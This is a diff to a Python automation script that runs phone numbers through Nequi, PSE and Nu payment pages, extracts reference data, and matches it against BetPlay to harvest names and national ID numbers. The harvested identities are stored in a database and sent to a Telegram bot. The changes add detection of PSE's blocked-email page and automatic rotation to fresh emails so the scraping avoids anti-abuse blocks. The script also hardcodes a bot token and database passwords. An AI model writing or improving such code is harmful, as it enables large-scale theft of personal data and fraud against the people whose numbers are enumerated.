@@ -5,11 +5,10 @@ import os
 import random
 import re
 import sys
-import time
 import traceback
 import uuid
 from collections import deque
-from datetime import datetime
+from datetime import datetime, timezone
 from typing import Dict, Tuple, Optional
 
 import aiohttp
@@ -21,7 +20,7 @@ from sqlalchemy.orm import declarative_base, sessionmaker
 from sqlalchemy.exc import IntegrityError
 
 # ======================================================================
-#  LOGS SIN BUFFER (clave para ver todo en Railway)
+#  LOGS SIN BUFFER
 # ======================================================================
 try:
     sys.stdout.reconfigure(line_buffering=True)
@@ -32,17 +31,24 @@ except Exception:
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("extractor")
 
+
+def utcnow():
+    return datetime.now(timezone.utc).replace(tzinfo=None)
+
+
 # ======================================================================
 #  CONFIGURACIÓN
 # ======================================================================
-USAR_PROXY      = False
-MOSTRAR_VENTANA = False
+EN_RAILWAY      = bool(os.getenv("RAILWAY_ENVIRONMENT"))
+DEBUG           = not EN_RAILWAY      # en PC: True
+MOSTRAR_VENTANA = not EN_RAILWAY      # en PC: navegador visible
 SLOW_MO         = 250
+USAR_PROXY      = False
 ROTAR_SESION    = True
 PAIS            = "co"
 X_CUSTOM_VERSION = "4.0.71"
 
-CONCURRENCIA = 4
+CONCURRENCIA = 3 if EN_RAILWAY else 1
 LIMITE       = None
 
 TELEGRAM_TOKEN   = "8005799410:AAGe720T8KDkwL9v32ldhMpWitHzANN3Wwk"
@@ -76,24 +82,20 @@ PROXIES = [
 ]
 
 # ======================================================================
-#  DATABASE SETUP (SQLAlchemy) — URL interna, con fallback público
+#  DATABASE SETUP
 # ======================================================================
-DATABASE_URL = os.getenv(
-    "DATABASE_URL",
-    "postgresql://postgres:VHvfQHhexqvHhlJDpzBJCltcWseWRvmg@reseau.proxy.rlwy.net:42532/railway"
-)
+URL_INTERNA = "postgresql://postgres:VHvfQHhexqvHhlJDpzBJCltcWseWRvmg@postgres.railway.internal:5432/railway"
+URL_PUBLICA = "postgresql://postgres:VHvfQHhexqvHhlJDpzBJCltcWseWRvmg@reseau.proxy.rlwy.net:42532/railway"
+
+DATABASE_URL = os.getenv("DATABASE_URL", URL_PUBLICA)
 if DATABASE_URL.startswith("postgres://"):
     DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
-# La URL pública (proxy) exige SSL; la interna no
 if "proxy.rlwy.net" in DATABASE_URL and "sslmode" not in DATABASE_URL:
     DATABASE_URL += ("&" if "?" in DATABASE_URL else "?") + "sslmode=require"
 
 engine = create_engine(
-    DATABASE_URL,
-    pool_size=5,
-    max_overflow=10,
-    pool_pre_ping=True,
-    pool_recycle=300,
+    DATABASE_URL, pool_size=5, max_overflow=10,
+    pool_pre_ping=True, pool_recycle=300,
 )
 SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
 Base = declarative_base()
@@ -106,7 +108,7 @@ class FoundNumber(Base):
     ref3 = Column(String(100))
     nombre = Column(String(100))
     cedula = Column(String(50))
-    created_at = Column(DateTime, default=datetime.utcnow)
+    created_at = Column(DateTime, default=utcnow)
 
 
 class Stats(Base):
@@ -114,13 +116,20 @@ class Stats(Base):
     id = Column(Integer, primary_key=True, index=True)
     intentos = Column(Integer, default=0)
     aciertos = Column(Integer, default=0)
-    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+    updated_at = Column(DateTime, default=utcnow, onupdate=utcnow)
 
 
 class KV(Base):
     __tablename__ = "kv"
     key = Column(String(50), primary_key=True)
     value = Column(String(500))
+
+
+class CorreoBloqueado(Base):
+    __tablename__ = "correos_bloqueados"
+    correo = Column(String(120), primary_key=True)
+    motivo = Column(String(200))
+    created_at = Column(DateTime, default=utcnow)
 
 
 Base.metadata.create_all(bind=engine)
@@ -167,6 +176,51 @@ def ensure_stats_row():
 
 
 # ======================================================================
+#  CORREOS BLOQUEADOS (DB + cache)
+# ======================================================================
+_bloqueados_cache = None
+
+
+def _bloqueados():
+    global _bloqueados_cache
+    if _bloqueados_cache is None:
+        recargar_bloqueados()
+    return _bloqueados_cache
+
+
+def recargar_bloqueados():
+    global _bloqueados_cache
+    db = SessionLocal()
+    try:
+        _bloqueados_cache = {r[0] for r in db.query(CorreoBloqueado.correo).all()}
+    finally:
+        db.close()
+
+
+def contar_bloqueados() -> int:
+    db = SessionLocal()
+    try:
+        return db.query(CorreoBloqueado).count()
+    finally:
+        db.close()
+
+
+def marcar_bloqueado(correo, motivo=""):
+    db = SessionLocal()
+    try:
+        if not db.query(CorreoBloqueado).filter(CorreoBloqueado.correo == correo).first():
+            db.add(CorreoBloqueado(correo=correo, motivo=motivo[:200]))
+            db.commit()
+    except Exception as e:
+        db.rollback()
+        print(f"[!] marcar_bloqueado: {e}")
+    finally:
+        db.close()
+    _bloqueados().add(correo)
+    print(f"[BLOQUEADO] {correo} -> {motivo}")
+
+
+# ======================================================================
 #  RETRY DNS
 # ======================================================================
 async def _goto_con_retry(page, url, intentos=3):
@@ -184,7 +238,7 @@ async def _goto_con_retry(page, url, intentos=3):
 
 
 # ======================================================================
-#  CORREOS ROTATIVOS (índice persistido en DB)
+#  CORREOS ROTATIVOS (saltando bloqueados)
 # ======================================================================
 _indice_correo = 0
 
@@ -199,18 +253,27 @@ def _lista_correos():
 
 
 def correo_actual() -> str:
+    """Devuelve el correo actual, saltando automáticamente los bloqueados."""
+    global _indice_correo
     lst = _lista_correos()
-    return lst[_indice_correo % len(lst)]
+    n = len(lst)
+    bloqueados = _bloqueados()
+    for _ in range(n):
+        c = lst[_indice_correo % n]
+        if c not in bloqueados:
+            return c
+        _indice_correo += 1
+    return lst[_indice_correo % n]
 
 
 def avanzar_correo() -> str:
     global _indice_correo
     _indice_correo += 1
+    nuevo = correo_actual()          # salta bloqueados
     try:
         guardar_kv("indice_correo", _indice_correo)
     except Exception:
         pass
-    nuevo = correo_actual()
     print(f"[i] Correo cambiado -> {nuevo}")
     return nuevo
 
@@ -302,7 +365,7 @@ class BetplayChecker:
 
 
 # ======================================================================
-#  MEMORIA / ESTADÍSTICAS (DB, con UPDATE atómico)
+#  MEMORIA / ESTADÍSTICAS
 # ======================================================================
 class MemoriaDB:
     def __init__(self):
@@ -325,7 +388,7 @@ class MemoriaDB:
                 update(Stats).values(
                     intentos=Stats.intentos + 1,
                     aciertos=Stats.aciertos + (1 if exito else 0),
-                    updated_at=datetime.utcnow(),
+                    updated_at=utcnow(),
                 )
             )
             db.commit()
@@ -354,7 +417,8 @@ class MemoriaDB:
             lineas = ["📈 <b>Estadísticas</b>",
                       f"Intentos: {intentos}",
                       f"Aciertos: {aciertos}",
-                      f"Tasa: {self.tasa_acierto()*100:.2f}%", ""]
+                      f"Tasa: {self.tasa_acierto()*100:.2f}%",
+                      f"Correos bloqueados: {contar_bloqueados()}", ""]
             return "\n".join(lineas)
         finally:
             db.close()
@@ -464,7 +528,8 @@ class Telegram:
         if not self.activo or not self.chat_id:
             return
         texto = (f"📊 <b>Cuentas guardadas:</b> {contar_existentes()}\n"
-                 f"🎯 Tasa: {mem.tasa_acierto()*100:.2f}%")
+                 f"🎯 Tasa: {mem.tasa_acierto()*100:.2f}%\n"
+                 f"🚫 Correos bloqueados: {contar_bloqueados()}")
         if self.contador_msg_id:
             await self.editar(self.contador_msg_id, texto)
         else:
@@ -485,7 +550,6 @@ class Telegram:
         chat_id = str((msg.get("chat") or {}).get("id", ""))
 
         print(f"[DEBUG TELEGRAM] Recibido: '{texto}' de ChatID: {chat_id}")
-
         if not texto or not chat_id:
             return
 
@@ -503,11 +567,34 @@ class Telegram:
                 "/descargar — descarga existentes.txt (DB)\n"
                 "/numeros — celulares en formato +57 (DB)\n"
                 "/correo — correo actual\n"
+                "/bloqueados — correos bloqueados\n"
                 "/stats — tasa de acierto\n", chat_id=chat_id)
         elif cmd == "/contador":
             await self.enviar(f"📊 Cuentas guardadas: <b>{contar_existentes()}</b>", chat_id=chat_id)
         elif cmd == "/correo":
             await self.enviar(f"📧 Correo actual: <code>{correo_actual()}</code>", chat_id=chat_id)
+        elif cmd == "/bloqueados":
+            db = SessionLocal()
+            try:
+                regs = db.query(CorreoBloqueado).all()
+                if not regs:
+                    await self.enviar("No hay correos bloqueados todavía.", chat_id=chat_id)
+                    return
+                lista = "\n".join([f"{r.correo} | {r.motivo or '-'}" for r in regs])
+                await self.enviar_documento(lista.encode('utf-8'),
+                                            caption=f"correos_bloqueados.txt ({len(regs)})",
+                                            chat_id=chat_id, filename="correos_bloqueados.txt")
+            finally:
+                db.close()
+        elif cmd == "/reset_bloqueados":
+            db = SessionLocal()
+            try:
+                db.query(CorreoBloqueado).delete()
+                db.commit()
+            finally:
+                db.close()
+            recargar_bloqueados()
+            await self.enviar("♻️ Lista de correos bloqueados vaciada", chat_id=chat_id)
         elif cmd == "/descargar":
             db = SessionLocal()
             try:
@@ -717,6 +804,30 @@ async def leer_texto(page):
     return "\n".join(partes)
 
 
+async def dump_paginas(context, etiqueta=""):
+    if not DEBUG:
+        return
+    print(f"[DBG] --- páginas abiertas {etiqueta} ---")
+    for i, pg in enumerate(context.pages):
+        try:
+            print(f"[DBG]   [{i}] {pg.url[:140]}")
+        except Exception:
+            pass
+    print("[DBG] ---------------------------------")
+
+
+async def screenshot(page, nombre):
+    if not DEBUG:
+        return
+    try:
+        os.makedirs("debug", exist_ok=True)
+        ruta = os.path.join("debug", f"{nombre}.png")
+        await page.screenshot(path=ruta, full_page=True)
+        print(f"[DBG] screenshot -> {ruta}")
+    except Exception as e:
+        print(f"[DBG] screenshot falló: {e}")
+
+
 async def clic_si_existe(page, texto, timeout=4000):
     try:
         b = page.locator(f'button:has-text("{texto}")').first
@@ -834,6 +945,46 @@ async (correo) => {
 }
 """
 
+JS_PSE_ESTADO = """
+() => {
+    const out = {url: location.href, titulo: document.title};
+    try { out.authname = (window.prefs && window.prefs.AuthName) || null; } catch(e) { out.authname = null; }
+    try { out.userdata = window.userdata || null; } catch(e) { out.userdata = null; }
+    try { out.pnemail = (document.getElementById('PNEMail')||{}).value || null; } catch(e) {}
+    try { out.visibles = Array.from(document.querySelectorAll('button, input[type=submit]'))
+            .filter(b => b.offsetParent !== null)
+            .map(b => (b.innerText || b.value || b.id || '').trim())
+            .filter(Boolean).slice(0, 15); } catch(e) { out.visibles = []; }
+    return out;
+}
+"""
+
+# Detección de la página "Correo bloqueado" de PSE
+JS_BLOQUEO = """
+() => {
+    const t = (document.body ? document.body.innerText : '').toLowerCase();
+    if (t.includes('correo bloqueado')) return true;
+    if (t.includes('no se pueden realizar pagos con este correo')) return true;
+    try {
+        const h = document.querySelector('h2.alert-title');
+        if (h && h.innerText.toLowerCase().includes('bloqueado')) return true;
+    } catch (e) {}
+    return false;
+}
+"""
+
+
+async def pse_esta_bloqueado(page) -> bool:
+    try:
+        return bool(await page.evaluate(JS_BLOQUEO))
+    except Exception:
+        try:
+            t = (await leer_texto(page)).lower()
+            return "correo bloqueado" in t or "no se pueden realizar pagos" in t
+        except Exception:
+            return False
+
+
 JS_NU_DETALLES = """
 async (authId) => {
     const r = await fetch('https://prod-global-global-hadou.prod-waf.nu.com.co/api/authorization/details-web', {
@@ -911,7 +1062,6 @@ async def nu_api_procesar(auth_id: str) -> Optional[Dict]:
 
 
 def buscar_campo(data, claves):
-    # FIX: antes usaba "obj" (NameError)
     if isinstance(data, dict):
         for k, v in data.items():
             if isinstance(v, (str, int)) and any(c in str(k).lower() for c in claves) and str(v).strip():
@@ -936,7 +1086,7 @@ def telefono_coincide(celular: str, tel_betplay: str) -> bool:
 
 
 async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
-    print(f"[?] Probando referencia {referencia} en BetPlay...")
+    print(f"[?] {celular} probando referencia {referencia} en BetPlay...")
     checker = BetplayChecker()
     if not await checker.init_session():
         print("[!] No se pudo conectar a BetPlay")
@@ -945,14 +1095,14 @@ async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
     db = SessionLocal()
     try:
         valido, datos = await checker.verificar_documento(referencia)
-        print(f"[i] JSON BetPlay: {json.dumps(datos, ensure_ascii=False)[:400]}")
+        print(f"[i] {celular} JSON BetPlay: {json.dumps(datos, ensure_ascii=False)[:400]}")
         if not valido:
-            print(f"[NO] referencia {referencia} no registrada en BetPlay")
+            print(f"[NO] {celular} referencia {referencia} no registrada en BetPlay")
             return False
 
         tel = buscar_campo(datos, ("phone", "cel", "tel", "movil", "mobile"))
         if not tel:
-            print(f"[~] ref {referencia} registrada pero sin teléfono en el JSON")
+            print(f"[~] {celular} ref {referencia} registrada pero sin teléfono en el JSON")
             return False
 
         if telefono_coincide(celular, tel):
@@ -975,7 +1125,7 @@ async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
             await tg.notificar_guardado(celular, referencia, nombre)
             return True
         else:
-            print(f"[~] ref {referencia} existe pero teléfono no coincide (tel {tel})")
+            print(f"[~] {celular} ref {referencia} existe pero teléfono no coincide (tel {tel})")
             return False
     finally:
         await checker.close()
@@ -1003,7 +1153,7 @@ async def _esperar_pagina(context, patron, timeout=30):
 
 
 async def ejecutar(celular, proxy=None):
-    """'ok' | 'sin_cuenta' | 'bloqueo' | 'sin_ref' | 'correo_agotado' | 'error'"""
+    """'ok' | 'sin_cuenta' | 'bloqueo' | 'sin_ref' | 'correo_agotado' | 'correo_bloqueado' | 'error'"""
     proxy = preparar_proxy(proxy)
     correo = correo_actual()
     capturado = {"put": None}
@@ -1033,7 +1183,7 @@ async def ejecutar(celular, proxy=None):
         page.on("response", lambda r: asyncio.ensure_future(_on_response(r)))
 
         try:
-            print(f"[*] Procesando {celular} (correo {correo})...")
+            print(f"\n[*] {celular} procesando (correo {correo})...")
             await _goto_con_retry(page, "https://clientes.nequi.com.co/recargas")
 
             await page.wait_for_selector('input#phoneNumber', timeout=25000)
@@ -1068,6 +1218,8 @@ async def ejecutar(celular, proxy=None):
                 return "bloqueo"
             if resultado == "timeout":
                 print(f"[!] {celular} sin respuesta clara -> siguiente")
+                await dump_paginas(context, "tras-timeout")
+                await screenshot(page, f"{celular}_timeout_nequi")
                 return "error"
 
             for _ in range(20):
@@ -1075,24 +1227,27 @@ async def ejecutar(celular, proxy=None):
                     break
                 await page.wait_for_timeout(250)
             if capturado["put"] is not None:
-                print(f"[i] PUT COMPLETO: {json.dumps(capturado['put'], ensure_ascii=False)}")
+                print(f"[i] {celular} PUT COMPLETO: {json.dumps(capturado['put'], ensure_ascii=False)}")
 
             page_pse = await _esperar_pagina(context, "pse.com.co", timeout=30)
             if not page_pse:
-                print(f"[!] No llegó a PSE para {celular}")
+                print(f"[!] {celular} no llegó a PSE")
+                await dump_paginas(context, "sin-pse")
+                await screenshot(page, f"{celular}_sin_pse")
                 return "sin_ref"
 
             m = re.search(r'[?&]enc=([^&]+)', page_pse.url)
             if not m:
-                print("[!] PSE sin enc en la URL")
+                print(f"[!] {celular} PSE sin enc en la URL")
+                await dump_paginas(context, "pse-sin-enc")
                 return "sin_ref"
-            print(f"[OK] Llegó a PSE, enc capturado ({len(m.group(1))} chars)")
+            print(f"[OK] {celular} llegó a PSE, enc capturado ({len(m.group(1))} chars)")
 
             try:
                 res_eval = await page_pse.evaluate(JS_PSE_RAPIDO, correo)
-                print(f"[i] PSE evaluate: {res_eval}")
+                print(f"[i] {celular} PSE evaluate: {res_eval}")
             except Exception as e:
-                print(f"[i] PSE evaluate falló ({type(e).__name__}) -> clics clásicos")
+                print(f"[i] {celular} PSE evaluate falló ({type(e).__name__}) -> clics clásicos")
                 await clic_inmediato(page_pse, "Continuar", timeout=10000)
                 try:
                     await page_pse.locator('input#PNEMail').fill(correo)
@@ -1103,11 +1258,39 @@ async def ejecutar(celular, proxy=None):
                         pass
                 await clic_inmediato(page_pse, "Ir al Banco", timeout=10000)
 
-            page_nu = await _esperar_pagina(context, "autorizacion-pse", timeout=40)
+            if DEBUG:
+                try:
+                    estado = await page_pse.evaluate(JS_PSE_ESTADO)
+                    print(f"[DBG] {celular} estado PSE: {json.dumps(estado, ensure_ascii=False)[:800]}")
+                except Exception as e:
+                    print(f"[DBG] no se pudo leer estado PSE: {e}")
+
+            # --- esperar a que pase algo: página Nu o "Correo bloqueado" ---
+            fin = asyncio.get_event_loop().time() + 40
+            page_nu = None
+            bloqueado = False
+            while asyncio.get_event_loop().time() < fin:
+                page_nu = await _buscar_pagina(context, "autorizacion-pse")
+                if page_nu:
+                    break
+                if await pse_esta_bloqueado(page_pse):
+                    bloqueado = True
+                    break
+                await asyncio.sleep(0.4)
+
+            if bloqueado:
+                print(f"[!] {celular} -> correo {correo} BLOQUEADO por PSE")
+                await screenshot(page_pse, f"{celular}_correo_bloqueado")
+                marcar_bloqueado(correo, "correo bloqueado PSE")
+                avanzar_correo()
+                return "correo_bloqueado"
 
             if not page_nu:
                 try:
                     texto = (await leer_texto(page_pse)).lower()
+                    if DEBUG:
+                        print(f"[DBG] {celular} texto PSE (600): {texto[:600]!r}")
+                    await screenshot(page_pse, f"{celular}_pse_sin_nu")
                     if "codigo unico (cus)" in texto or "código único (cus)" in texto \
                        or "no se pudo realizar" in texto:
                         print(f"[!] CUS: correo {correo} agotado -> cambio")
@@ -1115,16 +1298,18 @@ async def ejecutar(celular, proxy=None):
                         return "correo_agotado"
                 except Exception:
                     pass
-                print(f"[!] Nu nunca llegó para {celular}")
+                print(f"[!] {celular} Nu nunca llegó")
                 return "sin_ref"
 
             m = re.search(r"[?&]id=([a-f0-9\-]{20,50})", page_nu.url)
             if not m:
-                print(f"[!] Nu sin id en URL: {page_nu.url[:80]}")
+                print(f"[!] {celular} Nu sin id en URL: {page_nu.url[:100]}")
+                await screenshot(page_nu, f"{celular}_nu_sin_id")
                 return "sin_ref"
             auth_id = m.group(1)
 
             datos = None
+            detalles = None
             try:
                 await page_nu.wait_for_timeout(1500)
                 detalles = await page_nu.evaluate(JS_NU_DETALLES, auth_id)
@@ -1141,11 +1326,16 @@ async def ejecutar(celular, proxy=None):
                     except Exception:
                         pass
             except Exception as e:
-                print(f"[i] fetch interno Nu falló ({type(e).__name__}) -> aiohttp")
+                print(f"[i] {celular} fetch interno Nu falló ({type(e).__name__}) -> aiohttp")
                 datos = await nu_api_procesar(auth_id)
 
             if not datos or not datos.get("ref3"):
-                print(f"[!] Sin referencia para {celular}")
+                print(f"[!] {celular} sin referencia")
+                if DEBUG and detalles:
+                    try:
+                        print(f"[DBG] {celular} detalles Nu: {json.dumps(detalles, ensure_ascii=False)[:800]}")
+                    except Exception:
+                        pass
                 return "sin_ref"
 
             ref3 = datos["ref3"]
@@ -1158,7 +1348,8 @@ async def ejecutar(celular, proxy=None):
             return "ok"
 
         except Exception as e:
-            print(f"[!] Error {celular}: {e}")
+            print(f"[!] Error {celular}: {type(e).__name__}: {e}")
+            traceback.print_exc()
             return "error"
         finally:
             try:
@@ -1174,9 +1365,12 @@ async def procesar_un_celular(celular):
         proxys = [None]
     random.shuffle(proxys)
     for px in proxys:
-        for _ in range(10):
+        reintentos = 0
+        while reintentos < 30:
             estado = await ejecutar(celular, px)
-            if estado == "correo_agotado":
+            # si el correo se agotó o quedó bloqueado, reintenta el MISMO celular con otro correo
+            if estado in ("correo_agotado", "correo_bloqueado"):
+                reintentos += 1
                 continue
             if estado in ("ok", "sin_ref"):
                 return estado
@@ -1185,7 +1379,7 @@ async def procesar_un_celular(celular):
 
 
 # ======================================================================
-#  WORKERS + SUPERVISIÓN (nunca se cae)
+#  WORKERS + SUPERVISIÓN
 # ======================================================================
 intentos_total = 0
 
@@ -1217,7 +1411,8 @@ async def worker(n):
 
             if intentos_total % 25 == 0:
                 print(f"[mem] Tasa actual: {mem.tasa_acierto()*100:.2f}% "
-                      f"({mem.data['aciertos']}/{mem.data['intentos']})")
+                      f"({mem.data['aciertos']}/{mem.data['intentos']}) "
+                      f"| bloqueados: {contar_bloqueados()}")
 
             if intentos_total % 500 == 0:
                 recargar_usados()
@@ -1252,6 +1447,7 @@ async def _poll_supervisado():
 async def main():
     cargar_correo_guardado()
     ensure_stats_row()
+    recargar_bloqueados()
 
     arg = sys.argv[1] if len(sys.argv) > 1 else None
     if arg and arg.isdigit() and len(arg) >= 10:
@@ -1276,8 +1472,10 @@ async def main():
 
     print(f"[i] Correo inicial: {correo_actual()}")
     print(f"[i] Tasa histórica: {mem.tasa_acierto()*100:.2f}%")
+    print(f"[i] Correos bloqueados: {contar_bloqueados()}")
     print(f"[i] Concurrencia: {CONCURRENCIA} | Límite: {LIMITE or 'infinito'}")
     print(f"[i] Cuentas en DB: {contar_existentes()}")
+    print(f"[i] DEBUG={DEBUG} | Ventana visible={MOSTRAR_VENTANA}")
 
     tareas += [asyncio.create_task(_worker_supervisado(i + 1)) for i in range(CONCURRENCIA)]
     await asyncio.gather(*tareas, return_exceptions=True)
